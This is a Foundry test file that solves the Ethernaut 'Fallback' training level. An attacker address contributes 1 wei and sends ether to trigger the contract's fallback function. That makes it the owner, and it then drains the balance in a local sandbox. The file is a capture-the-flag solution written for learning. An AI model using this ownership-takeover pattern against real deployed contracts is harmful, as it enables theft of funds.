// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// testing functionalities
import "forge-std/Test.sol";

// Ethernaut game components
import "src/levels/01-Fallback/FallbackFactory.sol";
import "src/core/Ethernaut.sol";

contract FallbackTest is Test {
    /*//////////////////////////////////////////////////////////////
                            GAME INSTANCE SETUP
    //////////////////////////////////////////////////////////////*/

    Ethernaut ethernaut;

    /// @dev eve is the attacker
    address eve = makeNameForAddress("eve");

    function setUp() public {
        emit log_string("Setting up Fallback level...");
        ethernaut = new Ethernaut();
        // We need to give eve some funds to attack the contract
        vm.deal(eve, 10 wei);
    }

    /*//////////////////////////////////////////////////////////////
                LEVEL INSTANCE -> EXPLOIT -> SUBMISSION
    //////////////////////////////////////////////////////////////*/

    function testFallbackExploit() public {
        /*//////////////////////////////////////////////////////////////
                            LEVEL INSTANCE SETUP
        //////////////////////////////////////////////////////////////*/

        FallbackFactory fallbackFactory = new FallbackFactory();

        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eve);

        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback fallbackContract = Fallback(payable(levelAddress));

        emit log_named_address(
            "The original owner of the contract: ",
            fallbackContract.owner()
        );
        emit log_named_address(
            "Address of the exploit contract: ",
            address(this)
        );
        emit log_named_address("Eve's address: ", address(eve));
        emit log_named_uint("Balance of Eve (before): ", eve.balance);
        emit log_named_uint(
            "Contract balance (before): ",
            address(fallbackContract).balance
        );

        /*//////////////////////////////////////////////////////////////
                                LEVEL EXPLOIT
        //////////////////////////////////////////////////////////////*/

        /**
         * YOUR CODE GOES HERE
         */
        fallbackContract.contribute.value(1 wei)();
        emit log_named_uint(
            "Eve's contribution: ",
            fallbackContract.getContribution()
        );

        (bool success, ) = address(fallbackContract).call.value(1 wei)("");
        require(success);

        emit log_named_uint(
            "Balance of the contract before withdrawal: ",
            address(fallbackContract).balance
        );

        fallbackContract.withdraw();

        emit log_named_uint(
            "Ending balance of the contract: ",
            address(fallbackContract).balance
        );
        emit log_named_address(
            "New owner of the contract: ",
            fallbackContract.owner()
        );
        emit log_named_uint("Balance of Eve (after): ", eve.balance);

        /*//////////////////////////////////////////////////////////////
                                LEVEL SUBMISSION
        //////////////////////////////////////////////////////////////*/

        bool challengeCompleted = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(challengeCompleted);
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    /**
     * I've found this useful function
     * in github/twpony Ethernaut repo
     * @notice This function allows for creating labels (names) for addresses
     * which will improve readability in traces
     * @param name you pass the name like "alice" or "bob" and it will create
     * an address for that person
     */
    function makeNameForAddress(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
